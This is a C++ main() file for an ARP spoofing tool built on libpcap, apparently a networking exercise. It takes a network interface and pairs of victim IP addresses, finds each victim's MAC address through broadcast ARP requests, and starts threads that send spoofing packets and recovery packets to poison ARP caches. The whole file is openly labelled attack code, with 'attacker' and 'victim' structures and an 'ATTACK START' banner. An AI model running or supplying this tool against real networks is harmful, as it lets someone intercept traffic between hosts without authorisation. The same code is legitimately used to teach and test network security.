#include "getmyaddr.h"
#include "arpfunc.h"

int main(int argc, char* argv[]) {
	if (argc < 4) {
		usage();
		return false;
	}
	char* interface = argv[1];

	Attackerinfo attacker;
	uint8_t my_mac[6] = {0x00};
	getMacAddress(my_mac, interface); //get my mac address
	attacker.mac = my_mac;
	attacker.ip = getIPAddress(interface);

	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(interface, BUFSIZ, 1, 1, errbuf);
	if (handle == NULL) {
		fprintf(stderr, "pcap_open_live(%s) return null - %s\n", interface, errbuf);
		return -1;
	}

	int res;
	int flow = (argc-2)/2;
	EthArpPacket packet;
	Node* victim = new Node[flow];
	if(victim == NULL)
		return -1;
	printf("=====FIRST ATTACK START=====\n");
	for(int i = 2;i<argc;i=i+2)
	{
		victim[i/2 - 1].sender_ip = Ip(argv[i]);
		victim[i/2 - 1].target_ip = Ip(argv[i+1]);
		makeArpPacket(&packet, Mac("ff:ff:ff:ff:ff:ff"), attacker.mac, Mac("00:00:00:00:00:00"), attacker.mac, attacker.ip, victim[i/2 - 1].sender_ip, req);
		res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		}
		victim[i/2 - 1].sender_mac = getotherMac(handle, victim[i/2 - 1].sender_ip);
		makeArpPacket(&packet, Mac("ff:ff:ff:ff:ff:ff"), attacker.mac, Mac("00:00:00:00:00:00"), attacker.mac, attacker.ip, victim[i/2 - 1].target_ip, req);
		res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		}
		victim[i/2 - 1].target_mac = getotherMac(handle, victim[i/2 - 1].target_ip);
	}
	printf("======FIRST ATTACK END======\n");
	
	thread releasethr(release_thread, handle, &attacker, victim, flow);
	thread sendthr(send_thread, handle, &attacker, victim, flow);
	//thread catchthr(catch_thread, handle, &attacker, victim, flow);
	releasethr.join();
	sendthr.join();
	//catchthr.join();
	
	pcap_close(handle);
	delete[] victim;
}